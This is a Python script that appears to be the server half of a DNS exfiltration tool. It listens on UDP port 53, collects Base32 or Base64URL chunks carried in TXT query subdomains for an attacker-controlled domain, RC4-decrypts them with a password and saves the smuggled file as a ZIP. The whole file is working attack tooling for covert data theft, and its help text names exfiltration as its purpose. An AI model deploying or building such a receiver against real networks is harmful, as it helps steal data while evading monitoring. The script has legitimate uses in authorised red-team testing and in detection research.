#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import socket
from dnslib import *
from base64 import b64decode, b32decode
import sys

#======================================================================================================
#                                          HELPERS FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
# RC4 encryption/decryption class
#------------------------------------------------------------------------
class RC4:
    def __init__(self, key=None):
        self.state = list(range(256))
        self.x = self.y = 0
        if key is not None:
            self.key = key.encode()
            self.init(self.key)

    def init(self, key):
        for i in range(256):
            self.x = (key[i % len(key)] + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = self.y = 0

    def binaryDecrypt(self, data):
        output = bytearray(len(data))
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            xorIndex = (self.state[self.x] + self.state[self.y]) & 0xFF
            output[i] = data[i] ^ self.state[xorIndex]
        return output

#------------------------------------------------------------------------
def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))
    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write(f'[{bar}] {percents}%\t{status}\r')
    sys.stdout.flush()

#------------------------------------------------------------------------
def fromBase64URL(msg):
    msg = msg.replace('_', '/').replace('-', '+')
    padding = '=' * (-len(msg) % 4)
    return b64decode(msg + padding)

#------------------------------------------------------------------------
def fromBase32(msg):
    mod = len(msg) % 8
    padding = '=' * ((8 - mod) % 8)
    return b32decode(msg.upper() + padding)

#------------------------------------------------------------------------
def color(string, color=None):
    attr = ['1']
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return f'\x1b[{";".join(attr)}m{string}\x1b[0m'
    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
        elif string.strip().startswith("[+]"):
            attr.append('32')
        elif string.strip().startswith("[?]"):
            attr.append('33')
        elif string.strip().startswith("[*]"):
            attr.append('34')
        return f'\x1b[{";".join(attr)}m{string}\x1b[0m'

#======================================================================================================
#                                          MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
    parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password", required=True)
    args = parser.parse_args()

    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))
    print(color("[*] DNS server listening on port 53"))

    try:
        useBase32 = False
        chunkIndex = 0
        fileData = ''
        nbChunks = 0
        fileName = ""

        while True:
            data, addr = udps.recvfrom(1024)
            request = DNSRecord.parse(data)

            if request.q.qtype == QTYPE.TXT:
                qname = str(request.q.qname)

                if qname.upper().startswith("INIT."):
                    msgParts = qname.split(".")
                    msg = fromBase32(msgParts[1])
                    fileName, nbChunksStr = msg.decode().split('|')
                    nbChunks = int(nbChunksStr)

                    if msgParts[2].upper() == "BASE32":
                        useBase32 = True
                        print(color("[+] Data was encoded using Base32"))
                    else:
                        print(color("[+] Data was encoded using Base64URL"))

                    fileData = ''
                    chunkIndex = 0
                    print(color(f"[+] Receiving file [{fileName}] as a ZIP file in [{nbChunks}] chunks"))

                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
                    udps.sendto(reply.pack(), addr)

                else:
                    msg = qname[0:-(len(args.domainName) + 2)]
                    chunkNumber, rawData = msg.split('.', 1)

                    if int(chunkNumber) == chunkIndex:
                        fileData += rawData.replace('.', '')
                        chunkIndex += 1
                        progress(chunkIndex, nbChunks, "Receiving file")

                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunkNumber)))
                    udps.sendto(reply.pack(), addr)

                    if chunkIndex == nbChunks:
                        print('\n')
                        try:
                            rc4Decryptor = RC4(args.password)
                            outputFileName = fileName + ".zip"
                            print(color(f"[+] Decrypting using password [{args.password}] and saving to output file [{outputFileName}]"))
                            with open(outputFileName, 'wb') as fileHandle:
                                dataBytes = fromBase32(fileData) if useBase32 else fromBase64URL(fileData)
                                fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(dataBytes)))
                            print(color(f"[+] Output file [{outputFileName}] saved successfully"))
                        except IOError:
                            print(color(f"[!] Could not write file [{outputFileName}]", "red"))
            else:
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                udps.sendto(reply.pack(), addr)

    except KeyboardInterrupt:
        pass
    finally:
        print(color("[!] Stopping DNS Server", "red"))
        udps.close()
